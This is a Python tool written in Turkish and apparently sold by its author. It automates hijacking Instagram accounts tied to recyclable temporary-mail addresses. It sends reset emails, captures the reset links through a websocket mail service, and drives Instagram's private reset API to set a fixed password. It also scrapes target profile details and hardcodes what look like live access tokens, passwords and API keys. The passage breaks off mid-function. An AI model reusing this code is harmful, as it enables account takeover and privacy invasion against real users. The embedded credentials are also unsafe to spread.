import requests
import re
import base64
import time
import os
import threading
import random
from time import sleep
import httpx, uuid, time, random, string, uuid, user_agent
import websocket
import json
import datetime
import sys
import secrets
from urllib.parse import urlparse, parse_qs
import queue
from concurrent.futures import ThreadPoolExecutor

x = datetime.datetime.now()
kapanis = datetime.datetime(2026, 10, 1, 00, 30)

if x > kapanis:
    
    print( ' ❌ Tool durduruldu. Satın almak için yaz Dev -> @AtlasPy')
    
    
    sys.exit(0)
try:
    from colorama import Fore, Style, init as colorama_init
    colorama_init(autoreset=True)
except ImportError:
    os.system('pip install colorama')
    from colorama import Fore, Style, init as colorama_init
    colorama_init(autoreset=True)

try:
    from cfonts import render, say
except ImportError:
    os.system('pip install python-cfonts')
    from cfonts import render, say

bi, hit, be, dead, gi, don = 0, 0, 0, 0, 0, 0
donr = 0
J = '\x1b[2;36m'
N = '\x1b[1;37m'

doner = 0
token = ""
chid = ""
cl = 1
dev_name = "@PyAtlas"
channel_name = "@AtlasxPython"

red = "\033[1m\033[31m"
green = "\033[1m\033[32m"
yellow = "\033[1m\033[33m"
blue = "\033[1m\033[34m"
cyan = "\033[1m\033[36m"
white = "\033[1m\033[37m"
orange = "\033[1m\033[38;5;208m"
reset = "\033[0m"

LOGO = render('{Hi2in}', colors=['white', 'green'], align='center')


def startup():
    global token, chid, cl
    os.system('cls' if os.name == 'nt' else 'clear')
    print(f'''
  ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━   
              {LOGO}
             Dev: @PyAtlas / @AtlasxPython      
  ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━   
        ''')

    token = input(f'{cyan}[•] Bot Token: ').strip()
    while not token:
        print(f'{red}[!] Token bos olamaz! ')
        token = input(f'{cyan}[•] Bot Token Gir: ').strip()

    chid = input(f'{cyan}[•]  İd : ').strip()
    while not chid:
        print(f'{red}[!] ID bos olamaz!{reset}')
        chid = input(f'{cyan}[•] İd Gir: ').strip()

    
    
    


IG_TOKEN = "Bearer IGT:2:eyJkc191c2VyX2lkIjoiMTQ3OTQ4NTQ5NTIiLCJzZXNzaW9uaWQiOiIxNDc5NDg1NDk1MiUzQXpQYnB4cXRUZnZ0RlNkJTNBMTklM0FBWWp1UjNJTV90cmtKZXZkdFlxMXRva01rN0xPeUo1aW4wZF9tYmVqeHcifQ=="
UA = "Instagram 316.0.0.38.109 Android"


RANGES = {
    "2010": (1, 1279000),
    "2011": (1279001, 17750000),
    "2012": (17750001, 279760000),
    "2013": (289760001, 800990000),
    "2014": (1229010000, 1429010000),
    "2015": (2000000000, 2400000000),
    "2016": (2800000000, 3000000000),
    "2017": (4113668786, 4413668786),
    "2018": (6099785217, 6499785217),
    "2019": (9207940634, 9707940634),
    "2020-2026": (30054029835, 60099999999),
}


def get_year_from_id(user_id):
    try:
        uid = int(user_id)
        for year, (start, end) in RANGES.items():
            if start <= uid <= end:
                return year
        return "2010-2026"
    except:
        return "x"



def get_social_info(username):
    """SocialChecker API üzerinden username ile full info çeker ve user_id (pk) döndürür."""
    mail = "ghawva@hi2.in"
    sifre = "Hasan7272!"
    token_url = "https://www.googleapis.com/identitytoolkit/v3/relyingparty/verifyPassword"
    token_params = {'key': "AIzaSyCUk1sVd9lQKA5s7sFfIOTyooHipBG_YWk"}
    token_data = {
        "email": mail,
        "password": sifre,
        "returnSecureToken": True,
        "clientType": "CLIENT_TYPE_ANDROID"
    }
    token_headers = {
        'User-Agent': "Dalvik/2.1.0 (Linux; U; Android 16; 2311DRK48G Build/BP2A.250605.031.A3)",
        'Connection': "Keep-Alive",
        'Accept-Encoding': "gzip",
        'Content-Type': "application/json",
        'X-Android-Package': "com.oezgueng.socialchecker",
        'X-Android-Cert': "61ED377E85D386A8DFEE6B864BD85B0BFAA5AF81",
        'Accept-Language': "tr-TR, en-US",
        'X-Client-Version': "Android/Fallback/X24001000/FirebaseCore-Android",
        'X-Firebase-GMPID': "1:632316797008:android:1d32f9c7caa400a9747155",
        'X-Firebase-Client': "H4sIAAAAAAAA_6tWykhNLCpJSk0sKVayio7VUSpLLSrOzM9TslIyUqoFAFyivEQfAAAA",
        'X-Firebase-AppCheck': "eyJlcnJvciI6IlVOS05PV05fRVJST1IifQ=="
    }

    id_token = None
    try:
        resp = requests.post(token_url, params=token_params, data=json.dumps(token_data),
                             headers=token_headers, timeout=15)
        id_token = resp.json().get('idToken')
    except Exception as e:
        print(f"[!] Token alınamadı: {e}")

    user_data = {}
    if id_token:
        info_url = "https://socialchecker.app/api/app/instagram"
        info_payload = {
            "path": "get_info_by_username",
            "payload": {"username": username}
        }
        info_headers = {
            'User-Agent': "okhttp/4.12.0",
            'Accept': "application/json",
            'Accept-Encoding': "zstd, br, gzip",
            'Content-Type': "application/json",
            'authorization': f"Bearer {id_token}"
        }
        try:
            resp2 = requests.post(info_url, data=json.dumps(info_payload),
                                  headers=info_headers, timeout=20)
            data = resp2.json()
            user_data = data.get('response', {}).get('body', {}).get('user', {})
        except Exception as e:
            print(f"[!] SocialChecker isteği başarısız: {e}")
            user_data = {}
    else:
        print("[!] ID Token alınamadı, SocialChecker atlanıyor.")

    return user_data



def get_detailed_info(user_id):
    join_date = "Alinamadi"
    location = "Alinamadi"
    category = ""
    is_business = False
    try:
        resp = requests.post(
            f"https://i.instagram.com/api/v1/users/{user_id}/info_stream/",
            data={"is_prefetch": "false", "entry_point": "profile",
                  "from_module": "search_typeahead",
                  "_uuid": "6b4df3f6-8663-4439-af43-54b3e3d8dca1"},
            headers={"User-Agent": UA, "Authorization": IG_TOKEN,
                     "X-IG-App-ID": "567067343352427"},
            timeout=10
        )
        user = {}
        if resp.status_code == 200:
            try:
                lines = resp.text.strip().split('\n')
                user = json.loads(lines[1]).get("user", {})
                try:
                    user_detailed = json.loads(lines[2]).get("user", {})
                    category = user_detailed.get("category", "").strip()
                except:
                    category = user.get("category", "").strip()
                is_business = user.get("is_business", False)
            except:
                pass

        # @AtlasPy
        try:
            variables_data = ('{"params":{"app_id":"com.bloks.www.ig.about_this_account",'
                              '"infra_params":{"device_id":"6b4df3f6-8663-4439-af43-54b3e3d8dca1"},'
                              '"bloks_versioning_id":"b07c6b5ea93d2cf8d3582bc3688f78b5adb49ace81156e669d9ca3497258bd57",'
                              '"params":"{\\"referer_type\\":\\"ProfileMore\\",'
                              '\\"target_user_id\\":\\"' + user_id + '\\"}"},"is_pando":true}')
            r2 = requests.post(
                "https://i.instagram.com/graphql_www",
                data={"method": "post", "pretty": "false", "format": "json",
                      "server_timestamps": "true", "locale": "user", "purpose": "fetch",
                      "fb_api_req_friendly_name": "IGBloksAppRootQuery",
                      "client_doc_id": "2533602983584098948018695922",
                      "enable_canonical_naming": "true",
                      "enable_canonical_variable_overrides": "true",
                      "enable_canonical_naming_ambiguous_type_prefixing": "true",
                      "variables": variables_data},
                headers={"User-Agent": UA, "authorization": IG_TOKEN},
                timeout=10
            )
            if r2.status_code == 200:
                bundle_str = r2.json()["data"]["1$bloks_app(params:$params)"]["screen_content"]["component"]["bundle"]["bloks_bundle_tree"]
                match = re.search(r"([A-ZÜĞİŞÇÖa-züğışçö]+\s+\d{4})", bundle_str)
                if match:
                    join_date = match.group(1)
                try:
                    bundle_json = json.loads(bundle_str)
                    country = None
                    is_visible = False
                    for item in bundle_json.get("layout", {}).get("bloks_payload", {}).get("data", []):
                        if item.get("data", {}).get("key") == "IG_ABOUT_THIS_ACCOUNT:about_this_account_country":
                            country = item.get("data", {}).get("initial")
                        if item.get("data", {}).get("key") == "IG_ABOUT_THIS_ACCOUNT:about_this_account_country_visibility":
                            is_visible = item.get("data", {}).get("initial", False)
                    if country and is_visible:
                        location = country
                    elif country:
                        location = f"{country} (Gizli)"
                    else:
                        location = "Paylasilmamis"
                except:
                    pass
        except:
            pass
    except:
        pass
    return join_date, location, category, is_business



def process_username(username):
    """Kullanıcı adından tüm bilgileri çeker ve dict döndürür."""
    username = username.strip().lstrip("@")
    if not username:
        return None

    # 1) SocialChecker'dan full info + pk (user_id)
    social_data = get_social_info(username)

    full_name = social_data.get('full_name', 'Yok') if social_data else 'Yok'
    followers = social_data.get('follower_count', 0) if social_data else 0
    following = social_data.get('following_count', 0) if social_data else 0
    posts = social_data.get('media_count', 0) if social_data else 0
    bio = social_data.get('biography', '') if social_data else ''
    is_private = social_data.get('is_private', False) if social_data else False
    is_verified = social_data.get('is_verified', False) if social_data else False
    profile_pic = social_data.get('profile_pic_url', '') if social_data else ''
    pk = social_data.get('pk', social_data.get('id', 'Yok')) if social_data else 'Yok'
    external_url = social_data.get('external_url', '') if social_data else ''
    category_social = social_data.get('category_name', social_data.get('category', '')) if social_data else ''
    is_business_social = social_data.get('is_business', False) if social_data else False
    public_email = social_data.get('public_email', '') if social_data else ''

    meta_verified_standard = "Aktif✅" if followers > 5 and posts > 2 else "❌"
    meta_business_active = "Aktif✅" if is_business_social else "❌"

    # 2) pk varsa orijinal Instagram API'den detaylı bilgi al
    if pk and pk != 'Yok':
        join_date, location, category_ig, is_business_ig = get_detailed_info(str(pk))
        year_from_id = get_year_from_id(str(pk))
    else:
        join_date, location, category_ig, is_business_ig = "Alinamadi", "Alinamadi", "", False
        year_from_id = "x"

    
    final_category = category_ig or category_social or "-"

    return {
        "username": username,
        "user_id": pk,
        "year_from_id": year_from_id,
        "full_name": full_name,
        "followers": followers,
        "following": following,
        "posts": posts,
        "bio": bio,
        "is_private": "Evet" if is_private else "Hayır",
        "is_verified": "Evet" if is_verified else "Hayır",
        "profile_pic": profile_pic,
        "external_url": external_url,
        "public_email": public_email,
        "join_date": join_date,
        "location": location,
        "category": final_category,
        "is_business": "Evet" if (is_business_ig or is_business_social) else "Hayır",
        "meta_verified_standard": meta_verified_standard,
        "meta_business_active": meta_business_active,
    }




def get_instagram_info_api(username):
    url = f"https://i.instagram.com/api/v1/users/web_profile_info/?username={username}"
    
    headers = {
        "Accept": "*/*",
        "Accept-Language": "en-US,en;q=0.9",
        "Origin": "https://www.instagram.com",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
        "X-IG-App-ID": "936619743392459",
        "X-Requested-With": "XMLHttpRequest"
    }
    
    try:
        with httpx.Client(http2=True, headers=headers, timeout=10.0) as session:
            response = session.get(url)
            if response.status_code == 200:
                data = response.json()
                user = data.get('data', {}).get('user', {})
                
                followers = user.get('edge_followed_by', {}).get('count', 0)
                following = user.get('edge_follow', {}).get('count', 0)
                full_name = user.get('full_name', 'N/A')
                is_private = user.get('is_private', False)
                is_verified = user.get('is_verified', False)
                posts_count = user.get('edge_owner_to_timeline_media', {}).get('count', 0)
                user_id = user.get('id', '0')
                biography = user.get('biography', 'N/A')
                is_professional = user.get('is_professional_account', False)
                category = user.get('category_name', 'N/A')
                email = user.get('business_email') or user.get('public_email') or 'N/A'
                phone = user.get('business_phone_number') or user.get('public_phone_number') or 'N/A'
                external_url = user.get('external_url', 'N/A')
                profile_pic = user.get('profile_pic_url', 'N/A')
                
                return {
                    'success': True,
                    'followers': followers,
                    'following': following,
                    'full_name': full_name,
                    'is_private': is_private,
                    'is_verified': is_verified,
                    'posts_count': posts_count,
                    'user_id': user_id,
                    'biography': biography,
                    'is_professional': is_professional,
                    'category': category,
                    'email': email,
                    'phone': phone,
                    'external_url': external_url,
                    'profile_pic': profile_pic,
                    'username': user.get('username', username)
                }
            else:
                return {'success': False, 'error': f'HTTP {response.status_code}'}
    except Exception as e:
        return {'success': False, 'error': str(e)}


def get_user_id_from_instagram(username):
    try:
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'X-IG-App-ID': '936619743392459'
        }
        
        url = f"https://www.instagram.com/api/v1/users/web_profile_info/?username={username}"
        response = requests.get(url, headers=headers)
        
        if response.status_code == 200:
            data = response.json()
            user_id = data.get('data', {}).get('user', {}).get('id', '0')
            return user_id
        return '0'
    except:
        return '0'


def get_account_creation_date(username):
    try:
        user_id = get_user_id_from_instagram(username)
        if user_id == '0':
            return None

        url = "https://www.instagram.com/graphql/query/"
        
        headers = {
            "Accept": "*/*",
            "Accept-Language": "en-US,en;q=0.9",
            "Origin": "https://www.instagram.com",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
            "X-IG-App-ID": "936619743392459",
            "X-Requested-With": "XMLHttpRequest"
        }
        
        variables = {
            "id": user_id,
            "first": 50  
        }
        
        params = {
            "query_hash": "e769aa130647d2354c40ea6a439bfc08",  
            "variables": json.dumps(variables)
        }
        
        response = requests.get(url, headers=headers, params=params, timeout=10)
        
        if response.status_code == 200:
            data = response.json()
            edges = data.get('data', {}).get('user', {}).get('edge_owner_to_timeline_media', {}).get('edges', [])
            
            if edges:
                oldest_post = edges[-1].get('node', {})
                taken_at = oldest_post.get('taken_at_timestamp')
                
                if taken_at:
                    creation_date = datetime.datetime.fromtimestamp(taken_at)
                    return creation_date.year
        
        return None
        
    except Exception as e:
        print(f"Error getting creation date: {e}")
        return None


def estimate_account_year(user_id, followers_count=0, posts_count=0):
    try:
        id_int = int(user_id)
        current_year = datetime.datetime.now().year

        if id_int < 1000000:
            base_year = 2010
        elif id_int < 10000000:
            base_year = 2011
        elif id_int < 100000000:
            base_year = 2012
        elif id_int < 500000000:
            base_year = 2013
        elif id_int < 1500000000:
            base_year = 2014
        elif id_int < 3000000000:
            base_year = 2015
        elif id_int < 5000000000:
            base_year = 2016
        elif id_int < 8000000000:
            base_year = 2017
        elif id_int < 12000000000:
            base_year = 2018
        elif id_int < 20000000000:
            base_year = 2019
        elif id_int < 30000000000:
            base_year = 2020
        elif id_int < 45000000000:
            base_year = 2021
        elif id_int < 65000000000:
            base_year = 2022
        elif id_int < 100000000000:
            base_year = 2023
        else:
            base_year = 2024

        if base_year > current_year:
            base_year = current_year

        if posts_count == 0:
            if base_year < current_year - 1:
                return current_year - 1
        elif posts_count < 5 and followers_count < 50:
            if base_year < current_year - 1:
                return current_year - 1
        
        return base_year
        
    except:
        return datetime.datetime.now().year


def get_user_info_from_instagram(username):
    try:
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.9',
            'Accept-Encoding': 'gzip, deflate, br',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1',
            'Sec-Fetch-Dest': 'document',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-Site': 'none',
            'Sec-Fetch-User': '?1',
            'Cache-Control': 'max-age=0'
        }
        
        url = f"https://www.instagram.com/{username}/"
        response = requests.get(url, headers=headers)
        
        if response.status_code == 200:
            content = response.text
            
            try:
                shared_data_match = re.search(r'window\._sharedData\s*=\s*({.*?});', content)
                if shared_data_match:
                    shared_data = json.loads(shared_data_match.group(1))
                    user_data = shared_data.get('entry_data', {}).get('ProfilePage', [{}])[0].get('graphql', {}).get('user', {})
                    
                    followers = user_data.get('edge_followed_by', {}).get('count', 0)
                    following = user_data.get('edge_follow', {}).get('count', 0)
                    full_name = user_data.get('full_name', '')
                    is_private = user_data.get('is_private', False)
                    is_verified = user_data.get('is_verified', False)
                    posts_count = user_data.get('edge_owner_to_timeline_media', {}).get('count', 0)
                    
                    return followers, following, full_name, is_private, is_verified, posts_count
            except:
                pass
            
            followers_match = re.search(r'"edge_followed_by":\s*{"count":\s*(\d+)}', content)
            following_match = re.search(r'"edge_follow":\s*{"count":\s*(\d+)}', content)
            fullname_match = re.search(r'"full_name":"([^"]+)"', content)
            private_match = re.search(r'"is_private":(true|false)', content)
            verified_match = re.search(r'"is_verified":(true|false)', content)
            posts_match = re.search(r'"edge_owner_to_timeline_media":{"count":(\d+)}', content)
            
            followers = int(followers_match.group(1)) if followers_match else 0
            following = int(following_match.group(1)) if following_match else 0
            full_name = fullname_match.group(1) if fullname_match else ''
            is_private = private_match.group(1) == 'true' if private_match else False
            is_verified = verified_match.group(1) == 'true' if verified_match else False
            posts_count = int(posts_match.group(1)) if posts_match else 0
                
        return followers, following, full_name, is_private, is_verified, posts_count
        
    except Exception as e:
        return 0, 0, '', False, False, 0


def get_followers_following(username):
    result = get_instagram_info_api(username)
    
    if result['success']:
        creation_year = get_account_creation_date(username)
        if creation_year:
            account_year = creation_year
        else:
            account_year = estimate_account_year(result['user_id'], result['followers'], result['posts_count'])
        
        return (
            result['followers'],
            result['following'],
            result['full_name'],
            result['is_private'],
            result['is_verified'],
            result['posts_count'],
            account_year,
            result
        )
    else:
        try:
            followers, following, full_name, is_private, is_verified, posts_count = get_user_info_from_instagram(username)
            user_id = get_user_id_from_instagram(username)
            account_year = estimate_account_year(user_id, followers, posts_count)
            return followers, following, full_name, is_private, is_verified, posts_count, account_year, None
        except:
            return 0, 0, 'N/A', False, False, 0, datetime.datetime.now().year, None


def generate_device_info():
    devices = [
        {'android': '31/12', 'dpi': '480dpi', 'res': '1080x2400', 'brand': 'samsung', 'model': 'SM-G998B', 'cpu': 'qcom'},
        {'android': '33/13', 'dpi': '440dpi', 'res': '1080x2400', 'brand': 'google', 'model': 'Pixel-7', 'cpu': 'google'},
        {'android': '32/12L', 'dpi': '420dpi', 'res': '1080x2340', 'brand': 'oneplus', 'model': 'ONEPLUS-A6013', 'cpu': 'qcom'}
    ]
    device = random.choice(devices)
    ANDROID_ID = 'android-' + ''.join(random.choices(string.hexdigits.lower(), k=16))
    instagram_versions = ['285.0.0.0.107', '289.0.0.0.91', '291.0.0.0.119', '294.0.0.0.81']
    insta_version = random.choice(instagram_versions)
    USER_AGENT = f'Instagram {insta_version} Android ({device["android"]}; {device["dpi"]}; {device["res"]}; {device["brand"]}; {device["model"]}; {device["cpu"]}; en_US; {random.randint(300000000, 399999999)})'
    WATERFALL_ID = str(uuid.uuid4())
    timestamp = int(datetime.datetime.now().timestamp())
    password_suffix = '@Atlas!Xp92#LfQ7'
    PASSWORD = f'#PWD_INSTAGRAM:0:{timestamp}:{password_suffix}'
    return ANDROID_ID, USER_AGENT, WATERFALL_ID, PASSWORD, device


def simulate_human_delay():
    delays = [1.5, 2.0, 2.5, 3.0]
    time.sleep(random.choice(delays))



def reset_instagram_password(reset_link):
    try:
        parsed = urlparse(reset_link)
        params = parse_qs(parsed.query)
        uidb36 = params.get('uidb36', [None])[0]
        token = params.get('token', [None])[0]
        version = params.get('v', ['367.0.0.43.91'])[0]

        if not uidb36 or not token:
            return {'success': False, 'error': 'uidb36 veya token bulunamadi'}

        psw = '@Atlas!Xp92#LfQ7'
        s_k = f"#PWD_INSTAGRAM:0:{int(datetime.datetime.now().timestamp())}:{psw}"

        devices = [
            {'android': '35/15', 'dpi': '420dpi', 'res': '1080x2400', 'brand': 'samsung', 'model': 'SM-G991U', 'cpu': 'qcom', 'codename': 'o1q'},
            {'android': '35/15', 'dpi': '480dpi', 'res': '1080x2400', 'brand': 'samsung', 'model': 'SM-G998B', 'cpu': 'qcom', 'codename': 'p3s'},
            {'android': '35/15', 'dpi': '440dpi', 'res': '1080x2400', 'brand': 'google', 'model': 'Pixel-7', 'cpu': 'google', 'codename': 'panther'},
            {'android': '34/14', 'dpi': '420dpi', 'res': '1080x2340', 'brand': 'oneplus', 'model': 'ONEPLUS-A6013', 'cpu': 'qcom', 'codename': 'enchilada'}
        ]
        device = random.choice(devices)

        ANDROID_ID = f"android-{''.join(random.choices(string.hexdigits.lower(), k=16))}"
        IG_DEVICE_ID = str(uuid.uuid4())
        FAMILY_DEVICE_ID = str(uuid.uuid4())
        CONN_UUID = ''.join(random.choices(string.hexdigits.lower(), k=32))

        WATERFALL_ID = str(uuid.uuid4())
        SESSION_ID = f"nid={''.join(random.choices('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789/', k=11))};nc=1;fc=1;bc=0;"
        SESSION_PRIVATE = ''.join(random.choices('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789', k=12))

        now = time.time()
        PIGEON_TIME = f"{now}.{random.randint(100, 999)}"
        NAV_TIME = str(now)

        USER_AGENT = f"Instagram {version} Android ({device['android']}; {device['dpi']}; {device['res']}; {device['brand']}; {device['model']}; {device['codename']}; {device['cpu']}; en_US; {random.randint(300000000, 399999999)})"

        print("\n[1] Sending password reset...")

        url1 = "https://i.instagram.com/api/v1/accounts/password_reset/"

        payload1 = {
            'source': "one_click_login_email",
            'uidb36': uidb36,
            'device_id': ANDROID_ID,
            'token': token,
            'waterfall_id': WATERFALL_ID,
            'guid': str(uuid.uuid4()),
            'phone_id': str(uuid.uuid4()),
            '_uuid': str(uuid.uuid4()),
            '_csrftoken': "missing",
        }

        headers1 = {
            'User-Agent': USER_AGENT,
            'Content-Type': "application/x-www-form-urlencoded; charset=UTF-8",
            'accept-language': "en-US",
            'ig-intended-user-id': "0",
            'priority': "u=3",
            'x-bloks-is-layout-rtl': "false",
            'x-bloks-prism-ax-base-colors-enabled': "false",
            'x-bloks-prism-button-version': "CONTROL",
            'x-bloks-prism-colors-enabled': "true",
            'x-bloks-prism-font-enabled': "false",
            'x-bloks-prism-indigo-link-version': "0",
            'x-bloks-version-id': "e061cacfa956f06869fc2b678270bef1583d2480bf51f508321e64cfb5cc12bd",
            'x-fb-client-ip': "True",
            'x-fb-connection-type': "WIFI",
            'x-fb-friendly-name': "IgApi: accounts/password_reset/",
            'x-fb-network-properties': "VPN;Metered;Validated;LocalAddrs=/10.1.10.1,;",
            'x-fb-request-analytics-tags': '{"network_tags":{"product":"567067343352427","purpose":"fetch","surface":"undefined","request_category":"api","retry_attempt":"0"}}',
            'x-fb-server-cluster': "True",
            'x-ig-android-id': ANDROID_ID,
            'x-ig-app-id': "567067343352427",
            'x-ig-app-locale': "en_US",
            'x-ig-bandwidth-speed-kbps': str(random.randint(500, 1500)) + ".000",
            'x-ig-bandwidth-totalbytes-b': "0",
            'x-ig-bandwidth-totaltime-ms': "0",
            'x-ig-client-endpoint': "MainFeedFragment:feed_timeline",
            'x-ig-capabilities': "3brTv10=",
            'x-ig-connection-type': "WIFI",
            'x-ig-device-id': IG_DEVICE_ID,
            'x-ig-device-locale': "en_US",
            'x-ig-family-device-id': FAMILY_DEVICE_ID,
            'x-ig-mapped-locale': "en_US",
            'x-ig-nav-chain': f"MainFeedFragment:feed_timeline:1:cold_start:{NAV_TIME}:::",
            'x-ig-timezone-offset': "10800",
            'x-ig-www-claim': "0",
            'x-pigeon-rawclienttime': PIGEON_TIME,
            'x-tigon-is-retry': "False",
            'x-fb-conn-uuid-client': CONN_UUID,
            'x-fb-http-engine': "MNS/TCP",
            'x-fb-rmd': "state=URL_ELIGIBLE",
            'x-fb-session-id': SESSION_ID,
            'x-fb-session-private': SESSION_PRIVATE
        }

        r1 = requests.post(url1, data=payload1, headers=headers1, timeout=15)
        print(f"[1] Status: {r1.status_code}")

        X_MID = r1.headers.get("Ig-Set-X-Mid", "")
        if not X_MID:
            X_MID = "akgbYAABAAE3EXSBA1-tzpej_vXb"
            print("[!] No mid in response, using default")
        else:
            print(f"[+] Got mid from server: {X_MID}")

        j1 = json.loads(r1.text)
        user_id = j1.get('user_id', '')
        challenge_context = j1.get('challenge_context', '')
        print(f"[+] user_id: {user_id}")

        print("\n[2] Sending challenge redirect...")

        PIGEON_TIME2 = f"{time.time()}.{random.randint(100, 999)}"
        NAV_TIME2 = str(time.time())

        url2 = "https://i.instagram.com/api/v1/bloks/async_action/com.bloks.www.ig.challenge.redirect.async/"

        payload2 = {
            'user_id': user_id,
            'cni': "0",
            'nonce_code': "",
            'bk_client_context': '{"bloks_version":"e061cacfa956f06869fc2b678270bef1583d2480bf51f508321e64cfb5cc12bd","styles_id":"instagram"}',
            'challenge_context': challenge_context,
            'bloks_versioning_id': "e061cacfa956f06869fc2b678270bef1583d2480bf51f508321e64cfb5cc12bd",
            'get_challenge': "true"
        }

        headers2 = headers1.copy()
        headers2.update({
            'x-mid': X_MID,
            'x-fb-friendly-name': "IgApi: bloks/async_action/com.bloks.www.ig.challenge.redirect.async/",
            'x-ig-nav-chain': f"MainFeedFragment:feed_timeline:1:cold_start:{NAV_TIME2}:::",
            'x-pigeon-rawclienttime': PIGEON_TIME2,
            'x-bloks-version-id': "e061cacfa956f06869fc2b678270bef1583d2480bf51f508321e64cfb5cc12bd"
        })

        r2 = requests.post(url2, data=payload2, headers=headers2, timeout=15)
        print(f"[2] Status: {r2.status_code}")

        new_mid = r2.headers.get("Ig-Set-X-Mid", "")
        if new_mid:
            X_MID = new_mid
            print(f"[+] Updated mid: {X_MID}")

        j2 = json.loads(r2.text)
        context_data = ""
        try:
            ft = j2['layout']['bloks_payload']['ft']
            for key, value in ft.items():
                if 'context_data' in value and 'Q-PTBA' in value:
                    match = re.search(r'(Q-PTBA[^"]+?\|appr)', value)
                    if match:
                        context_data = match.group(1)
                        break
            if not context_data:
                match = re.search(r'(Q-PTBA[^"]+?\|appr)', r2.text)
                if match:
                    context_data = match.group(1)
        except:
            match = re.search(r'(Q-PTBA[^"]+?\|appr)', r2.text)
            if match:
                context_data = match.group(1)

        if context_data:
            print(f"[+] context_data: {context_data[:80]}...")

        print("\n[3] Sending new password...")

        PIGEON_TIME3 = f"{time.time()}.{random.randint(100, 999)}"
        NAV_TIME3 = str(time.time())
        PIGEON_SESSION_ID = f"UFS-{str(uuid.uuid4())}-1"

        params_data = {
            "client_input_params": {
                "password": s_k,
                "aac": ""
            },
            "server_params": {
                "context_data": context_data,
                "INTERNAL__latency_qpl_marker_id": 36707139,
                "INTERNAL__latency_qpl_instance_id": random.randint(100000000000000, 999999999999999)
            }
        }

        url3 = "https://i.instagram.com/api/v1/bloks/async_action/com.bloks.www.ap.last_resort_recovery.reset_password.async/"

        payload3 = {
            'params': json.dumps(params_data),
            'bk_client_context': '{"bloks_version":"e061cacfa956f06869fc2b678270bef1583d2480bf51f508321e64cfb5cc12bd","styles_id":"instagram"}',
            'bloks_versioning_id': "e061cacfa956f06869fc2b678270bef1583d2480bf51f508321e64cfb5cc12bd"
        }

        headers3 = headers1.copy()
        headers3.update({
            'x-mid': X_MID,
            'accept-language': "en-US",
            'x-fb-friendly-name': "IgApi: bloks/async_action/com.bloks.www.ap.last_resort_recovery.reset_password.async/",
            'x-ig-bandwidth-speed-kbps': str(random.randint(1000, 2000)) + ".000",
            'x-ig-bandwidth-totalbytes-b': str(random.randint(200000, 500000)),
            'x-ig-bandwidth-totaltime-ms': str(random.randint(200, 400)),
            'x-ig-client-endpoint': "com.bloks.www.ap.last_resort_recovery.reset_password",
            'x-ig-nav-chain': f"MainFeedFragment:feed_timeline:1:cold_start:{NAV_TIME2}:::,com.bloks.www.ap.last_resort_recovery.reset_password:com.bloks.www.ap.last_resort_recovery.reset_password:2:warm_start:{NAV_TIME3}:::",
            'x-pigeon-rawclienttime': PIGEON_TIME3,
            'x-pigeon-session-id': PIGEON_SESSION_ID,
            'x-bloks-version-id': "e061cacfa956f06869fc2b678270bef1583d2480bf51f508321e64cfb5cc12bd"
        })

        r3 = requests.post(url3, data=payload3, headers=headers3, timeout=15)
        print(f"[3] Status: {r3.status_code}")

        if "BLOKS AUTH PLATFORM RESET PASSWORD" in r3.text or "has_whatsapp_installed" in r3.text:
            print("\n[✓] Password reset successful!")
            print(f"[✓] new password: {psw}")
            return {
                'success': True,
                'password': psw,
                'user_id': user_id,
                'android_id': ANDROID_ID,
                'user_agent': USER_AGENT,
                'device_info': device
            }
        else:
            print(f"\n[!] password reset hata: {r3.text[:200]}")
            return {'success': False, 'error': f'Final step failed: {r3.text[:200]}'}

    except Exception as e:
        return {'success': False, 'error': str(e)}



def send(eml):
    global don
    try:
        url = "https://www.instagram.com/api/v1/web/accounts/account_recovery_send_ajax/"
        payload = {"email_or_username": eml, "flow": "fxcal"}
        headers = {
            "User-Agent": "android_ua",
            "x-csrftoken": "missing",
            "accept-language": "en-EN,en;q=0.9"
        }
        with httpx.Client(http2=True, headers=headers, timeout=25) as c:
            r = c.post(url, data=payload)

            if "Thanks! Please check" in r.text:
                print('[+] Reset email gonderildi!')
                don += 1
            elif "doesn't have an associated user account" in r.text or "Sorry, this user is not active." in r.text:
                print('[-] Dead account!')
            else:
                print(f'[!] TURN ON VPN !!\n{r.text[:200]}')

        return True, None, eml

    except Exception as e:
        print(f'send hata: {e}')
        return False, None, eml



def getu(eml, hash_val, ex):
    global donr, dead
    ws = websocket.WebSocket()
    ws.connect("wss://ws.checker.in:8443", header=[
        "User-Agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/147.0.0.0 Mobile Safari/537.36",
        "Origin: https://hi2.in"
    ])
    print(ws.recv())

    ws.send(f"{ex}-{eml}-{hash_val}")
    ws.send("ping")

    i = 0
    reset_link = None
    username = None
    send(eml)

    while i <= 5:
        i += 1
        try:
            msg = ws.recv()
            print("Server:", msg[:200] + "..." if len(msg) > 200 else msg)

            if msg.startswith('{'):
                try:
                    data = json.loads(msg)

                    if 'body' in data and 'text' in data['body']:
                        email_text = data['body']['text']

                        reset_links = re.findall(r'https://instagram\.com/accounts/password/reset/confirm/[^\s"\'>]+', email_text)

                        if reset_links:
                            reset_link = reset_links[-1]
                            print("\n" + "=" * 50)
                            print("reset link : ")
                            print(reset_link)

                        username_match = re.search(r'Hi ([a-zA-Z0-9_]+),', email_text)
